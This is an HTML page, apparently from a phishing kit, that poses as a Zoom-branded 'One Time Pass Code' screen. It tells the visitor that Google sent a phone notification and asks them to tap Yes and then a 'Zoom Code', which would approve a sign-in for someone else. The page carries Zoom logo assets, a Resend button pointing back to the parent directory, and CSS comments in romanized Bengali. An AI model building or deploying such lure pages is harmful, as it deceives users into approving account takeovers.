<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="../../logo.png" />
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html, body {
      width: 100%;
      height: 100%;
      background-color: #ffffff;
      color: #202124;
      overflow: hidden;
    }

    /* Professional layout with perfect balancing */
    .container {
      width: 100%;
      height: 100dvh;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      text-align: center;
      padding: 2vh 5vw 2.5vh 5vw;
      background: #ffffff;
    }

    /* Top Header Group (Logo + Title) */
    .header-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 0.8vh;
    }

    /* Top Logo */
    .logo {
      width: 14vw;
      max-width: 60px;
      height: auto;
      object-fit: contain;
      border-radius: 50%;
    }

    /* Main Title - Boro font size */
    h1 {
      font-size: clamp(22px, 5.8vw, 28px);
      font-weight: 700;
      color: #1a1a1a;
    }

    /* Phone Graphic Illustration - Aro boro kora holo */
    .phone-illustration {
      width: 72vw;
      max-width: 310px;
      height: auto;
      max-height: 46vh;
      object-fit: contain;
      margin: auto 0;
    }

    /* Bottom Content Group (Text + Button) */
    .bottom-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 1.5vh;
    }

    /* Text Wrapper */
    .text-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 0.5vh;
    }

    /* Sub Heading - Boro font size */
    h2 {
      font-size: clamp(20px, 5vw, 25px);
      font-weight: 700;
      color: #1a1a1a;
    }

    /* Description Text - Boro font size */
    .desc-text {
      font-size: clamp(15.5px, 4.2vw, 19px);
      font-weight: 600;
      color: #374151;
      line-height: 1.4;
    }

    .desc-text span {
      font-weight: 800;
      color: #000000;
    }

    /* Resend Button - Boro ebong attractive */
    .btn-join {
      background-color: #007aff;
      color: white;
      padding: 15px 0;
      width: 100%;
      max-width: 370px;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 14px;
      cursor: pointer;
      box-shadow: 0 4px 14px rgba(0, 122, 255, 0.3);
      transition: background-color 0.2s, transform 0.1s;
    }

    .btn-join:hover {
      background-color: #005ec4;
    }

    .btn-join:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="header-group">
      <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
      <h1>One Time Pass Code</h1>
    </div>

    <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">

    <div class="bottom-group">
      <div class="text-group">
        <h2>Check your phone.</h2>
        <p class="desc-text">
          Google sent a notification to your phone.<br>
          <span>Tap Yes</span> on the notification<br>
          Then Tap Zoom Code
        </p>
      </div>
      <button class="btn-join" onclick="window.location.href='../'">Resend</button>
    </div>
  </div>

</body>
</html>
